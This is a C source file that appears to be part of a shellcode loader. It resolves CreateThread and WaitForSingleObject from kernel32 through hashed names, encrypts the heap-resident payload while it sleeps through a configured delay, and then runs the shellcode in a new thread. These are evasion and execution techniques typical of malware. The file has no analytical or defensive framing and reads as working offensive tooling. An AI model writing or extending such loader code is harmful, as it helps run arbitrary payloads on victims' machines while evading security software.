#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"









BOOL execution_load_apis() {
	g_ldr->apis->CreateThread = (pCreateThread)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATETHREAD);
	g_ldr->apis->WaitForSingleObject = (pWaitForSingleObject)GetProc(g_ldr->apis->modules.kernel32, HASHED_WAITFORSINGLEOBJECT);
	if (g_ldr->apis->CreateThread == NULL) {
		return FALSE;
	}
	return TRUE;
}

BOOL execution_run(MemoryInfo memInfo) {
	ldr_sleep_encrypt_heap(g_ldr->config->DelayBefore, memInfo.ShellCodeAddress, memInfo.BytesWrote);
	HANDLE hThread = g_ldr->apis->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memInfo.ShellCodeAddress, NULL, 0, NULL);
	if (hThread == NULL) return FALSE;
	g_ldr->apis->WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}


